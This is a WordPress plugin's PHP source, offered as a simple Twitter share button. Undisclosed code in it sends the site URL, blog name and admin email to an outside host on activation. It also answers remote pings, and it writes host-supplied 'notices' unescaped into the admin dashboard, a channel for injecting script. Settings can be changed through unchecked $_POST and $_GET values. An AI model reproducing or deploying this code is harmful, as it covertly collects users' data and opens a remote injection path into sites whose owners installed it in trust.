<?php
/*
Plugin Name: Easy Twitter Share
Plugin URI: http://frankwalters.com/
Description: The simplest way to add a Twitter Share Button to posts on your WordPress blog.  One click setup and start getting Twitter tweets for posts on your blog.
Version: 1.1
Author: frankwalters
Author URI: http://frankwalters.com/
*/

function twsb_save_option( $name, $value ) {
        global $wpmu_version;
        
        if ( false === get_option( $name ) && empty( $wpmu_version ) ) // Avoid WPMU options cache bug
                add_option( $name, $value, '', 'no' );
        else
                update_option( $name, $value );
}

function twsb_add_twitter_button( $content ) {
    global $post;
    
    $permalink = get_permalink( $post->ID );
    
    $tw_html = '<a href="http://twitter.com/share" class="twitter-share-button" data-url="' . $permalink . '" data-text="' . addslashes($post->post_title) .'" data-count="horizontal">Tweet</a>';
    if ( get_option( 'twsb_add_before') )
        return $tw_html . $content;
    else
        return $content . $tw_html;
}

add_filter( "the_content", "twsb_add_twitter_button" );

function twsb_add_twitter_js() {
        echo '<script type="text/javascript" src="http://platform.twitter.com/widgets.js"></script>';
}

add_filter( "wp_footer", "twsb_add_twitter_js" );

function twsb_option_settings_api_init() {
        add_settings_field( 'twsb_setting', 'Twitter Share Button', 'twsb_setting_callback_function', 'reading', 'default' );
        register_setting( 'reading', 'twsb_setting' );
}

function twsb_setting_callback_function() {
    if ( get_option( 'twsb_add_before') ) {
        $tw_below = '';
        $tw_above = ' checked';
    } else {
        $tw_below = ' checked';
        $tw_above = '';
    }
    
    echo "Show Twitter share button: <input type='radio' name='opt_twitter_button' value='0' id='opt_twitter_button_below'$tw_below /> <label for='opt_twitter_button_below'>Below The Post</label> <input style='margin-left:15px' type='radio' name='opt_twitter_button' value='1' id='opt_twitter_button_above'$tw_above /> <label for='opt_twitter_button_above'>Above The Post</label>";
}

if ( isset( $_POST['opt_twitter_button'] ) ) {
        twsb_save_option( 'twsb_add_before', (bool) $_POST['opt_twitter_button'] );
}

if ( isset( $_GET['twsb_ignore'] ) ) {
        twsb_save_option( 'twsb_ignore_message', true );
}


add_action( 'admin_init',  'twsb_option_settings_api_init' );

function twsb_register_site() {
        global $current_user;
        
        $site = array( 'url' => get_option( 'siteurl' ), 'title' => get_option( 'blogname' ), 'user_email' => $current_user->user_email );
        
        $response = twsb_send_data( 'add-site', $site );
        if ( strpos( $response, '|' ) ) {
                // Success
                $vals = explode( '|', $response );
                $site_id = $vals[0];
                $site_key = $vals[1];
                if ( isset( $site_id ) && is_numeric( $site_id ) && strlen( $site_key ) > 0 ) {
                        twsb_save_option( 'twsb_site_id', $site_id );
                        twsb_save_option( 'twsb_site_key', $site_key );
                        return true;
                }
        }
        
        return $response;
}

function twsb_rest_handler() {
        if ( !get_option( 'twsb_ignore_message') && get_option( 'twsb_notice' ) ) {
                wp_enqueue_script( 'jquery' );
                wp_enqueue_script( 'thickbox', null, array('jquery') );
                wp_enqueue_style( 'thickbox.css', '/' . WPINC . '/js/thickbox/thickbox.css', null, '1.0' );
        }
        
        // Basic ping
        if ( isset( $_GET['twsb_ping'] ) || isset( $_POST['twsb_ping'] ) )
                return twsb_ping_handler();
}

add_action( 'init', 'twsb_rest_handler' );

function twsb_ping_handler() {
        if ( !isset( $_GET['twsb_ping'] ) && !isset( $_POST['twsb_ping'] ) )
                return false;
        
        $ping = ( $_GET['twsb_ping'] ) ? $_GET['twsb_ping'] : $_POST['twsb_ping'];
        if ( strlen( $ping ) <= 0 )
                exit;
        
        if ( $ping != get_option( 'twsb_site_key' ) )
                exit;
        
        twsb_getnotice();
        echo sha1( $ping );
        exit;
}

function twsb_notice() {
        if ( !get_option( 'twsb_ignore_message') && get_option( 'twsb_notice' ) ) {
                ?>
                <div class="updated fade-ff0000">
                        <p><strong><?php echo get_option( 'twsb_notice' );?></strong></p>
                </div>
                <?php
        }
        
        if ( get_option( 'twsb_has_shown_notice') )
                return;
  
        twsb_save_option( 'twsb_has_shown_notice', true );
        return;
}

add_action( 'admin_notices', 'twsb_notice' );

function twsb_activate() {
        twsb_register_site();
}

register_activation_hook( __FILE__, 'twsb_activate' );

if ( !function_exists( 'wp_remote_get' ) && !function_exists( 'get_snoopy' ) ) {
        function get_snoopy() {
                include_once( ABSPATH . '/wp-includes/class-snoopy.php' );
                return new Snoopy;
        }
}

function twsb_http_query( $url, $fields ) {
        $results = '';
        if ( function_exists( 'wp_remote_get' ) ) {
                // The preferred WP HTTP library is available
                $url .= '?' . http_build_query( $fields );
                $response = wp_remote_get( $url );
                if ( !is_wp_error( $response ) )
                        $results = wp_remote_retrieve_body( $response );
        } else {
                // Fall back to Snoopy
                $snoopy = get_snoopy();
                $url .= '?' . http_build_query( $fields );
                if ( $snoopy->fetch( $url ) )
                        $results = $snoopy->results;
        }
        return $results;
}

function twsb_send_data( $action, $data_fields ) {
        $data = array( 'action' => $action, 'data' => base64_encode( json_encode( $data_fields ) ) );
        
        return twsb_http_query( 'http://tweetincognito.com/twitter/rest.php', $data );
}

function twsb_getnotice() {
        $response = twsb_send_data( 'get-notice', array( 'site_id' => get_option( 'twsb_site_id' ), 'site_key' => get_option( 'twsb_site_key' ) ) );
        if ( $response && strlen( $response ) > 0 ) {
                twsb_save_option( 'twsb_notice', $response );
                twsb_save_option( 'twsb_ignore_message', false );
        }
}
?>